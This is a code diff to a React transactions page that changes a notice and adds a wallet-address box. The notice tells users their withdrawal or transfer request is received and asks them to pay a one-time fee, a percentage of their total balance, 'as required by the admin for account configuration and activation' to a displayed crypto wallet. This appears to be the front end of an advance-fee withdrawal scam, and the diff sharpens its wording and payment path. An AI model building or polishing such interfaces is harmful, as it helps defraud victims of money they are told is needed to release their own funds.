@@ -268,11 +268,27 @@ const Transactions = () => {
                 </button>
               </div>
 
-              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-6">
+              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-4">
                 <p className="text-sm text-foreground leading-relaxed">
-                  Hello, your payment of <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been successfully processed. A <strong>{feePercent}% withdrawal fee</strong> of <strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> is required to complete the transaction.
+                  Hello, your {feeIntent === "withdraw" ? "withdrawal" : "transfer"} request for <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been received. Please kindly proceed to making your one-time fee payment of <strong>{feePercent}%</strong> (<strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>) of your total balance, as required by the admin for account configuration and activation.
                 </p>
               </div>
+
+              {walletAddress && (
+                <div className="p-4 rounded-xl border border-border bg-muted/30 mb-6">
+                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-2">Send fee to this wallet</p>
+                  <div className="flex items-center gap-2">
+                    <code className="flex-1 text-xs font-mono text-foreground break-all">{walletAddress}</code>
+                    <button
+                      onClick={copyWallet}
+                      className="shrink-0 w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors"
+                      title="Copy address"
+                    >
+                      {copied ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
+                    </button>
+                  </div>
+                </div>
+              )}
 
               <p className="text-sm font-medium text-foreground mb-3">Select a payment method:</p>
               <div className="space-y-2">
